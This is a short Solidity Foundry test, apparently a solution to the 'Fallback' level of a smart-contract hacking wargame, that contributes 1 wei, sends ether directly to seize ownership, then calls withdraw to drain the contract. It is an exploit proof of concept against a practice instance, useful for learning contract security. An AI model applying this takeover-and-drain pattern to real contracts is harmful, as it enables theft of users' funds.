// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level01.sol";

contract POC is Test {
    Fallback level01 = new Fallback();

    function testLevel01() external {
        level01.contribute{value: 1 wei}();
        level01.getContribution();

        (bool success, ) = address(level01).call{value: 1 wei}("");
        require(success, "Transfer failed!");

        level01.owner();
        level01.withdraw();
    }

    receive() external payable {}
}
